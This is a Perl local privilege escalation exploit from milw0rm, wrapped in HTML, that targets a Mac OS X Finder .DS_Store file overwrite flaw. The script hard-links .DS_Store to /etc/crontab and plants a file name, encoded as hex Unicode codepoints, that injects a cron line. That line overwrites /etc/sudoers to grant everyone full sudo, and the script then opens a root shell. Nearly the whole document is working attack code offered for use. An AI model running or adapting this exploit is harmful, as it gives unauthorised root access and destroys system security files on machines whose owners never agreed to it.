<html>
<head>
<title>Mac OS X DS_Store Arbitrary File Overwrite Exploit</title>
<pre>
#!/usr/bin/perl
#
# [OSX Finder] DS_Store arbitrary file overwrite exploit. (root version)
#
# vade79 -&gt; v9@fakehalo.us (fakehalo/realhalo)
#
# this will create a directory called &quot;xfinder&quot; in your home directory,
# once the root user has modified that directory using Finder in almost any
# way(such as copying a file out of it, etc) it will write to the .DS_Store
# file in that directory.  the data written to the .DS_Store file will
# consist of the filenames/subdirectories making up the directory and the
# attributes of the directory.
#
# this exploit works by linking the .DS_Store file to /etc/crontab, and
# creating a special unicode(utf8 encoded) file in the directory.  the file
# created in unicode is equal to(in ASCII):
#  '\n\n* * * * * root echo &quot;ALL ALL=(ALL) ALL&quot;&gt;/etc/sudoers\n\n'
#
# this file will display as a japanese-like series of characters and
# is (part of) what is written to the .DS_Store file, which allows for 
# the privilege escalation.  once this line has been written to
# /etc/crontab(along with other .DS_Store data), crontab will overwrite
# /etc/sudoers with &quot;ALL ALL=(ALL) ALL&quot; and you can then sudo to root.
#
# note: this is done through crontab-&gt;sudo because sudo will complain
# of the .DS_Store garbage data in the /etc/sudoers file and exit,
# whereas crontab will ignore it.
#
# (sorry for the squished/ugly script, just a precaution for
# wordwrapping)

use encoding utf8;
sub pexit{print(&quot;[!] @_.\n&quot;);exit(1);}
$testdir=&quot;$ENV{HOME}/xfinder&quot;;
print(&quot;[OSX Finder] DS_Store arbitrary file overwrite exploit.\n\n&quot;);
if(!-f&quot;/etc/crontab&quot;||!-f&quot;/etc/sudoers&quot;){
 pexit(&quot;/etc/crontab and /etc/sudoers are required for this to work&quot;);
}
mkdir($testdir)||pexit(&quot;Could make the directory \&quot;$testdir\&quot;, &quot; .
&quot;make sure it doesn't already exist&quot;);
chdir($testdir)||pexit(&quot;Could change the directory to \&quot;$testdir\&quot;&quot;);
# = &quot;\n\n* * * * * root echo &quot;ALL ALL=(ALL) ALL&quot;&gt;/etc/sudoers\n\n&quot;
open(TOUCH,&quot;&gt;&quot; . Encode::encode_utf8(
&quot;\x{0a0a}\x{2a20}\x{2a20}\x{2a20}\x{2a20}\x{2a20}\x{726f}\x{6f74}&quot; .
&quot;\x{2065}\x{6368}\x{6f20}\x{2241}\x{4c4c}\x{2041}\x{4c4c}\x{3d28}&quot; .
&quot;\x{414c}\x{4c29}\x{2041}\x{4c4c}\x{223e}\x{2f65}\x{7463}\x{2f73}&quot; .
&quot;\x{7564}\x{6f65}\x{7273}\x{0a0a}&quot;))||pexit(&quot;Could not create &quot; .
&quot;unicode/utf8 encoded filename&quot;);
close(TOUCH);
link(&quot;/etc/crontab&quot;,&quot;.DS_Store&quot;)||pexit(&quot;Could not link .DS_Store &quot; .
&quot;to /etc/crontab&quot;);
print(&quot;[+] Waiting for root user to modify \&quot;$testdir\&quot; with &quot; .
&quot;Finder...\n&quot;);
print(&quot;[?] (CTRL-C if desired, this script does not need to be &quot; .
&quot;running to work)\n&quot;);
@ast=@st=stat(&quot;/etc/crontab&quot;);
while($st[7]==$ast[7]&amp;&amp;$st[9]==$ast[9]){
 sleep(1);
 @ast=stat(&quot;/etc/crontab&quot;);
}
print(&quot;[+] /etc/crontab has been modified.\n&quot;);
print(&quot;[+] Waiting for crontab to change /etc/sudoers...\n&quot;);
@ast=@st=stat(&quot;/etc/sudoers&quot;);
while($st[7]==$ast[7]&amp;&amp;$st[9]==$ast[9]){
 sleep(1);
 @ast=stat(&quot;/etc/sudoers&quot;);
}
print(&quot;[+] /etc/sudoers has been modified.\n&quot;);
print(&quot;[+] Attempting to \&quot;sudo sh\&quot;. (use YOUR password)\n&quot;);
system(&quot;sudo sh&quot;);
exit(0);

# milw0rm.com [2005-02-07]
</pre>
</html>

